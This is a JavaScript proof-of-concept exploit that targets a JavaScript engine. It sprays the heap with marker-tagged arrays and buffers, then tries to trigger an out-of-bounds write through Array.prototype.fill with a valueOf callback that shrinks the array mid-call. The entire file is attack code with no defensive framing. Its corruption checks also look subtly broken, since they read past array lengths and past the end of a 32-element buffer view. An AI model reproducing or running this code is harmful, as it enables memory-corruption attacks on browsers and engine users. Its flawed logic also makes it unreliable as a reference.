import { log, sleep } from './module/utils.mjs';

class OptimizedOOBSpray {
    constructor() {
        this.arrays = [];
        this.buffers = [];
        this.objects = [];
        this.marker = 0x42424242;
        this.found = 0;
    }

    async execute() {
        let round = 0;
        while (true) {
            log("Round " + round);
            
            await this.mixedSpray(round);
            await this.triggerOOB();
            await this.checkAll();
            
            if (this.found > 2) {
                log("SUCCESS: " + this.found);
                break;
            }
            
            round++;
            if (round > 50) break;
            await sleep(30);
        }
    }

    async mixedSpray(round) {
        for (let i = 0; i < 200; i++) {
            const arr = new Array(100);
            for (let j = 0; j < 100; j++) {
                arr[j] = {
                    marker: this.marker,
                    round: round,
                    idx: i,
                    data: new ArrayBuffer(64)
                };
            }
            this.arrays.push(arr);
        }

        for (let i = 0; i < 100; i++) {
            const buffer = new ArrayBuffer(128);
            const view = new Uint32Array(buffer);
            view[0] = this.marker;
            view[1] = round;
            view[2] = i;
            this.buffers.push(buffer);
        }

        for (let i = 0; i < 100; i++) {
            this.objects.push({
                type: "spray",
                marker: this.marker,
                round: round,
                data: new Uint8Array(256)
            });
        }
    }

    async triggerOOB() {
        const v0 = [];
        for (let i2 = 0; i2 < 500000; i2++) {
            v0[i2] = {
                obj: true,
                index: i2,
                payload: new ArrayBuffer(32),
                data: [1, 2, 3, 4, 5]
            };
        }
        const v10 = new Object(Object, v0);
        function f11() {
            v0.length = 0;
            return 0;
        }
        const o14 = {
            "valueOf": f11,
        };
        v0.fill(v10, o14);
    }

    async checkAll() {
        for (let i = 0; i < this.arrays.length; i++) {
            const arr = this.arrays[i];
            for (let j = arr.length; j < arr.length + 30; j++) {
                if (arr[j] && arr[j].marker === this.marker) {
                    log("OOB array " + i + " at " + j);
                    this.found++;
                }
            }
        }

        for (let i = 0; i < this.buffers.length; i++) {
            const view = new Uint32Array(this.buffers[i]);
            if (view[50] === this.marker) {
                log("OOB buffer " + i);
                this.found++;
            }
        }

        for (let i = 0; i < this.objects.length; i++) {
            const obj = this.objects[i];
            if (obj.unexpected) {
                log("OOB object " + i);
                this.found++;
            }
        }
    }
}

new OptimizedOOBSpray().execute();